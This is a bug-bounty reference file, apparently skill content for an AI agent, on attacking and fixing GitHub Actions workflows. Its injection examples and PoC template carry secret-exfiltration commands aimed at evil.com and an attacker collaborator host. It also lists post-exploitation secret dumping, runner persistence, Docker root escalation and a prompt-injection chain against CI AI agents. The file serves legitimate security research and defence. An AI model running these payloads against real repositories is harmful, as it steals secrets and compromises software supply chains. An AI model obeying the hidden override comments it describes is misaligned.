# CI/CD — GitHub Actions

> Reference content for the `bug-bounty` skill. Originally CI/CD Pipeline — GitHub Actions Security of the monolithic SKILL.md (refactored 2026-11-18 for size/load efficiency).

## CI/CD Pipeline — GitHub Actions Security

> **Tooling**: Use [sisakulint](https://sisaku-security.github.io/lint/) for automated SAST — 52 rules, taint propagation across steps/jobs/reusable workflows, 81.6% coverage of GitHub Security Advisories (31/38 GHSAs). Install: `brew install sisakulint` or download binary from releases.
>
> **Quick scan**: `sisakulint scan .github/workflows/` — flags Critical/High issues with auto-fix suggestions.
> **Remote scan**: `sisakulint scan --remote owner/repo` — scan without cloning.

### Recon: Finding Workflow Files

```bash
# Clone target's public repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint on all workflows:
sisakulint scan .github/workflows/
```

### Category 1: Code Injection & Expression Safety (CICD-SEC-04)

**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.name
github.event.head_commit.message / .author.name
github.event.workflow_run.head_branch
github.head_ref
```

- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
  ```yaml
  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
  run: echo "${{ github.event.issue.title }}"

  # FIXED — use env var (shell-quoted, not expression-interpolated)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
  ```yaml
  # VULNERABLE — attacker injects newline + arbitrary VAR=VALUE
  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV

  # FIXED — use heredoc delimiter
  run: |
    {
      echo "BRANCH<<EOF"
      echo "${{ github.head_ref }}"
      echo "EOF"
    } >> $GITHUB_ENV
  ```
- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Output clobbering** — untrusted input → `$GITHUB_OUTPUT` without heredoc delimiter = downstream job manipulation
- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
  ```yaml
  # VULNERABLE
  run: docker run ${{ github.event.pull_request.body }}

  # FIXED — end-of-options marker + env var
  env:
    INPUT: ${{ github.event.pull_request.body }}
  run: docker run -- "$INPUT"
  ```
- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow

### Category 2: Pipeline Poisoning & Untrusted Checkout

**Root cause**: Privileged triggers (`pull_request_target`, `workflow_run`) checkout attacker's PR code, which then runs with repository secrets.

- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
  ```yaml
  # VULNERABLE — checks out attacker's PR code with repo secrets
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
        - run: make build  # runs attacker's Makefile with secrets

  # FIXED — only checkout base branch, or use read-only permissions
  permissions: {}
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
  ```
- [ ] **TOCTOU (Time-of-Check-Time-of-Use)** — label-gated approval + mutable ref = attacker adds label, pushes malicious commit after approval
- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow that processes untrusted input
- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
- [ ] **Cache poisoning (poisonable step)** — unsafe checkout followed by build step before cache save
- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
  ```yaml
  # VULNERABLE — downloads artifact from untrusted workflow, then executes it
  on: workflow_run
  steps:
    - uses: actions/download-artifact@v4
    - run: ./downloaded-binary  # attacker-controlled binary

  # FIXED — verify artifact hash/signature before execution
  ```
- [ ] **Artipacked** — `actions/checkout` with `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts
  ```yaml
  # FIXED
  - uses: actions/checkout@v4
    with:
      persist-credentials: false
  ```

### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)

- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
  ```yaml
  # VULNERABLE — tag can be force-pushed
  uses: actions/checkout@v4

  # FIXED — pinned to immutable commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] **Impostor commit** — fork network allows pushing commits with SHA that appears to belong to upstream repo
- [ ] **Ref confusion** — ambiguous tag/branch names exploited to load unintended action version
- [ ] **Known vulnerable actions** — check actions against GHSA database (sisakulint detects automatically)
- [ ] **Archived actions** — unmaintained action with unpatched vulnerabilities
- [ ] **Unpinned container images** — `image: ubuntu:latest` instead of SHA256 digest pin

### Category 4: Credential & Secret Protection

- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
  ```yaml
  # FIXED — exclude hidden files
  - uses: actions/upload-artifact@v4
    with:
      include-hidden-files: false
  ```
- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
  ```yaml
  # FIXED — manually mask derived secrets
  run: |
    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
    echo "::add-mask::$TOKEN"
  ```
- [ ] **Excessive `secrets: inherit`** — reusable workflow call inherits all secrets when it only needs one
- [ ] **Hardcoded credentials** — API keys, passwords, tokens directly in workflow YAML

### Category 5: Triggers & Access Control (CICD-SEC-01)

- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`, no approval gate, no ref restriction
- [ ] **Dangerous triggers with partial mitigation** — some protections present but bypassable
- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable (attacker can add labels)
- [ ] **Bot condition spoofing** — `if: github.actor != 'dependabot[bot]'` is trivially bypassed by naming account similarly
- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure = container escape → lateral movement
- [ ] **OIDC token theft** — CI runners expose OIDC tokens that grant cloud access

### Category 6: AI Agent Security (NEW — 2025+)

- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"` lets any user trigger AI agent execution
- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context = attacker prompt → RCE
- [ ] **Prompt injection via workflow context** — `${{ github.event.issue.body }}` interpolated into AI agent prompt parameter

### Hunting Workflow

```
1. Recon: find all .github/workflows/*.yml in target's public repos
2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
3. Triage: Critical/High findings → manual verification
4. For each finding:
   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
   b. What secrets are accessible? (check permissions: block, secrets usage)
   c. What's the blast radius? (repo secrets → deploy keys → cloud access)
5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
6. Prove: show secret exfiltration, code execution, or artifact tampering
```

### Expression Injection PoC Template

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### Real-World GHSAs (Proven Payouts)

| GHSA | Action | Bug Class | Severity |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain — impostor commit | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |

### A→B Signal: CI/CD Chains

```
Expression injection → secret exfiltration → cloud account takeover
Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
Artifact poisoning → release binary tampering → supply chain compromise
Cache poisoning → build output manipulation → backdoored deployment
Impostor commit → pinned action hijack → all downstream repos affected
OIDC token theft → cloud metadata → S3/GCS read → customer data
Self-hosted runner → container escape → internal network pivot
```

### Deep-Dive: From sisakulint Finding to Bounty Report

sisakulint findings are **potentially exploitable** — not confirmed bugs. Every finding needs manual verification. The patterns below are extracted from 36 real-world paid reports ($250K+ total payouts). Each section follows the thinking that led to actual bounty payments.

#### 1. Code Injection / Argument Injection

**Gate question:** Can an external attacker trigger this workflow AND does the tainted input reach a shell context?

**Verification depth:**
1. **Trigger accessibility** — `issues: opened` and `issue_comment: created` are triggerable by ANY GitHub user. `pull_request_target` is triggerable via fork PR. Check if there's an `if:` condition filtering by actor/association.
2. **Direct vs transitive taint** — The workflow file itself may look safe. Cycode found Bazel's $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}` via `with:` to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's `action.yml` had `run: TITLE="${{ inputs.issue-title }}"`. Conventional scanners (actionlint) missed this because they don't follow `uses:` into external composite actions. **Always fetch and read the composite action's action.yml.**
3. **Payload construction** — Branch names cannot contain spaces. Ultralytics YOLO attacker used `${IFS}` (Internal Field Separator) and Bash brace expansion `{curl,-sSfL,URL}` to bypass this. Issue titles/bodies have no such restriction.
4. **Secrets reachability** — Check `permissions:` at workflow AND job level. No explicit `permissions:` block = repo default (often `write-all`). Check `env:` blocks for `${{ secrets.* }}`. Check if `GITHUB_TOKEN` has write permissions.
5. **Impact chain** — Bazel: issue title injection → composite action shell injection → `BAZEL_IO_TOKEN` + `GITHUB_TOKEN (write-all)` → Bazel codebase backdoor capability (affects Google, Kubernetes, Uber, LinkedIn).

**Kill signals:** `${{ contains(...) }}` or `${{ startsWith(...) }}` returning booleans are NOT injectable — false positive. `${{ github.event.pull_request.labels.*.name }}` inside `contains()` evaluates to `true`/`false`, not the label text.

#### 2. Untrusted Checkout (Pwn Request)

**Gate question:** Does the workflow checkout attacker-controlled code AND then execute something from that checkout?

**Verification depth:**
1. **Explicit vs implicit code execution** — The Flank $7.5K bug: `gh pr checkout` → `gradle/gradle-build-action` runs Gradle → Gradle auto-evaluates `settings.gradle.kts` as Kotlin script. The attacker never wrote a `run:` command. **Any build tool that reads config from the repo is an execution vector**: `Makefile`, `package.json` (postinstall scripts), `setup.py`, `build.gradle.kts`, `.cargo/config.toml`, `Gemfile`.
2. **Issue_comment is as dangerous as pull_request_target** — Rspack NPM token theft: `issue_comment` trigger + `refs/pull/${{ github.event.issue.number }}/head` checkout. `issue_comment` runs in base repo context with full secrets. Draft PRs are included. No contributor status check. **Always check issue_comment workflows for PR checkout patterns.**
3. **Self-hosted runner escalation** — If `runs-on:` contains `self-hosted`, check: (a) Is the runner ephemeral? (`--ephemeral` in config.sh). (b) Is the runner in Docker group? (`docker run -v /:/host --privileged`). (c) PyTorch pattern: contributor trick (typo fix PR → merge → contributor status → auto-trigger on self-hosted runner without approval) → RoR (Runner-on-Runner: `RUNNER_TRACKING_ID=0` + install attacker's runner agent) → wait for privileged workflow → steal PATs from `.git/config` or process memory.
4. **TOCTOU** — Label-gated `pull_request_target` workflows: attacker gets label added (social engineering), workflow checks label exists, attacker pushes malicious commit between check and checkout. The `ref:` at checkout time resolves to the new commit. **Mutable refs (`github.event.pull_request.head.sha` at trigger time vs checkout time) are the root cause.**
5. **Post-exploitation** — After initial access, enumerate all secrets: `env | base64`, `cat /proc/self/environ`, `gcore $(pgrep Runner.Worker)` + `strings core.* | grep ghp_`. PyTorch attackers got 3 bot PATs → combined them to bypass branch protection on main.

**Kill signals:** `if: "!github.event.pull_request.head.repo.fork"` blocks external attackers. `permissions: {}` at workflow level with only `contents: read` at job level limits damage. Ephemeral runners with `--ephemeral` flag prevent persistence.

#### 3. Artifact Poisoning

**Gate question:** Is there a TWO-STAGE workflow pattern where Stage 1 (pull_request, no secrets) uploads artifacts and Stage 2 (workflow_run, with secrets) downloads and uses them?

**Verification depth:**
1. **Cross-workflow artifact flow** — Same-workflow upload/download (build job → test job via `needs:`) is NOT poisonable because the attacker's PR runs their own build. The dangerous pattern is: `pull_request` workflow uploads → separate `workflow_run` workflow downloads. `workflow_run` triggers on the completion of another workflow and runs in the DEFAULT BRANCH context with full secrets.
2. **Download path matters** — `actions/download-artifact` with `path: .` or workspace-relative paths (`grafana-server/bin`) can overwrite source code, build scripts, or binaries. Safe pattern: extract to `${{ runner.temp }}/artifacts`.
3. **Source validation** — Does the `workflow_run` consumer check `github.event.workflow_run.head_repository.full_name != github.repository`? If not, fork PR artifacts are consumed blindly. Rust release pipeline was vulnerable to exactly this.
4. **ArtiPACKED (persist-credentials)** — `actions/checkout` defaults to `persist-credentials: true`. This writes `GITHUB_TOKEN` to `.git/config`. If the artifact upload path includes `.git/` (e.g., `path: .`), the token is publicly downloadable from the Actions artifact. **Check**: does any `upload-artifact` step use `path: .` or a broad path that includes `.git/`?

**Kill signals:** Upload and download in the same workflow run (connected by `needs:`). `workflow_run` consumer that explicitly checks fork origin. `persist-credentials: false` on checkout.

#### 4. Cache Poisoning

**Gate question:** Can a fork PR write a cache entry that the default branch later restores in a privileged context?

**CRITICAL: GitHub's cache scoping does NOT fully prevent this.** A PR branch can read caches from the default branch. A fork PR workflow can WRITE cache entries. If the cache key is deterministic (`hashFiles('package-lock.json')`) and the attacker doesn't modify that file, the fork PR writes to the SAME cache key.

**Verification depth:**
1. **Key predictability** — `key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}` is fully predictable. Adding `github.sha` or `github.run_id` to the key makes it unpredictable. **Check every cache key for the presence of an unpredictable component.**
2. **Cache hierarchy exploitation** — `workflow_run` and `workflow_dispatch` workflows run in the default branch context. If they write to caches with predictable keys, an attacker who can trigger the upstream workflow (via fork PR) can pre-poison the cache. The `run-dashboard-search-e2e.yml` pattern: `workflow_run` trigger → `actions/cache` with `hashFiles()` key → all PR workflows read this cache.
3. **Payload injection** — Cacheract: inject malware into package manager caches (`node_modules/.cache`, `~/.cache/pip`, `~/.gradle/caches`). The malware self-perpetuates because each restore → build → save cycle preserves the payload. **Cache TTL is 7 days** — the payload survives across multiple workflow runs.
4. **Privileged consumption** — The cache is restored in a `push` or `schedule` workflow on the default branch. These workflows have full `secrets` access. The poisoned dependency executes during `npm install` / `pip install` / `gradle build` and exfiltrates secrets.
5. **Clinejection chain** — Prompt injection → AI agent runs `npm install` from attacker commit → Cacheract in npm cache → nightly publish workflow restores cache → VSCE_PAT, OVSX_PAT, NPM_RELEASE_TOKEN stolen → malicious Cline v2.3.0 published for 8 hours.

**Kill signals:** Cache key includes `github.sha` or `github.run_id`. Separate cache keys per workflow. `actions/cache/restore` (read-only) instead of `actions/cache` (read-write) in PR workflows.

#### 5. Self-Hosted Runners

**Gate question:** Is a self-hosted runner used in a PUBLIC repo where external contributors can trigger workflows?

**Verification depth:**
1. **Approval settings** — Default: "Require approval for first-time contributors". After ONE merged PR (even a typo fix), the attacker becomes a "contributor" and subsequent PRs auto-trigger without approval. GitHub runner-images $20K bug used exactly this trick.
2. **Runner persistence** — Non-ephemeral runners retain state between jobs. `RUNNER_TRACKING_ID=0` prevents the runner from cleaning up attacker processes after job completion. Detached Docker containers (`docker run -d --restart always`) also survive cleanup.
3. **Runner-on-Runner (RoR)** — Install an official GitHub Actions runner binary on the target's self-hosted runner, register it to attacker's private org. Uses only legitimate GitHub binaries and HTTPS to github.com — indistinguishable from normal runner traffic. **No C2 server needed. GitHub itself is the C2.**
4. **Lateral movement** — RoR persistence → wait for privileged `push`/`schedule` workflows → steal tokens from `.git/config`, `$GITHUB_ENV`, `/proc/PID/environ`, or Runner.Worker process memory. PyTorch: 3 bot PATs → 93 repos → AWS S3 write access → `pip install pytorch` supply chain.
5. **Docker group escalation** — `docker run -v /:/host --privileged alpine chroot /host` → full host root. Add SSH keys, modify sudoers, install persistent backdoors.

**Kill signals:** `--ephemeral` flag on runner registration. "Require approval for ALL outside collaborators" (not just first-time). Runner not in Docker group. Private repo (no external PRs).

#### 6. Supply Chain (commit-sha / impostor-commit / ref-confusion)

**Gate question:** Does the workflow use mutable tags (`@v1`, `@v2`) for actions, and could those tags be replaced?

**Verification depth:**
1. **Tag mutability** — `git tag -f v1 <malicious-commit>` replaces the tag. 98.4% of repos don't use SHA pinning (Legit Security 2024). tj-actions attack: all version tags (v1, v35, v45) replaced with memdump.py payload → 23K repos affected → 218 confirmed secret leaks.
2. **Impostor commits** — Fork network shares object store with parent. Attacker pushes a commit to fork, then references that commit SHA in the parent repo's `uses:`. GitHub resolves it because the SHA exists in the shared object store.
3. **RepoJacking** — Org renames create a redirect. Old name becomes available. Attacker registers old org name, creates same repo, hosts malicious action. Shopify/unity-buy-sdk used `MirrorNG/unity-runner` → MirrorNG renamed to MirageNet → `MirrorNG` was claimable. **Check**: `GET /users/<action-owner>` returns 404? Takeover possible.
4. **Payload stealth** — tj-actions memdump.py: extract secrets from Runner.Worker process memory via `/proc/PID/maps` + `/proc/PID/mem`, encrypt with AES+RSA, output to workflow log. Logs are publicly visible but encrypted — only attacker has the key.

**Kill signals:** Full 40-char SHA pinning (`uses: actions/checkout@b4ffde65...`). Dependabot configured for `github-actions` ecosystem. Organization-level action allowlist.

#### 7. AI Agent Security

**Gate question:** Is an AI agent (Gemini CLI, Claude Code, Cline, Codex) invoked in a workflow where external users can influence the prompt?

**Verification depth:**
1. **Trigger + prompt source** — `issues: opened` → AI triage bot reads `github.event.issue.body`. The body IS the prompt. HTML comments (`<!-- ignore previous instructions -->`) are invisible in GitHub UI but included in the API response and thus in the AI prompt.
2. **Tool permissions** — If the AI agent has Bash/Write/Edit tools and runs with secrets in env, prompt injection = RCE + secret exfil. `allowed_non_write_users: "*"` means ANY user can trigger.
3. **Multi-phase chain** — Clinejection: prompt injection → AI runs `npm install` from attacker commit → Cacheract plants in npm cache → nightly publish restores cache → tokens stolen → malicious version published. **A prompt injection finding alone may seem low-severity, but it's a gateway to cache poisoning and supply chain attacks.**

**Kill signals:** `author_association == 'MEMBER' || 'OWNER'` check before AI processing. `--read-only --no-exec` flags on AI CLI. `permissions: {}` at workflow level.

#### 8. Permissions / Secrets Hygiene

**Not standalone bugs** — these are force multipliers. A `code-injection-medium` with `permissions: write-all` is Critical. The same injection with `permissions: { contents: read }` is limited.

**Chaining checklist:**
- `secrets: inherit` on reusable workflow call → all org secrets accessible to called workflow
- `permissions:` block missing → repo default (often write-all)
- `GITHUB_TOKEN` with `contents: write` → CVE-2022-46258 pattern: use Contents API to create new workflow file → new workflow accesses ALL repo/org secrets (the original workflow never referenced them)

**Key references:**
- [sisaku-security/agent-idea/bugbountyreport](https://github.com/sisaku-security/agent-idea/tree/main/bugbountyreport) — 36 real-world reports with full attack chains
- [sisakulint docs/advisory](https://sisaku-security.github.io/lint/docs/advisory/) — 38 GHSAs with detection mapping
- [DEF CON 32: Grand Theft Actions](https://media.defcon.org/DEF%20CON%2032/) — Khan & Stawinski, $250K+ in self-hosted runner bugs
- [Synacktiv: GitHub Actions Exploitation (5 parts)](https://www.synacktiv.com/en/publications/github-actions-exploitation-introduction)
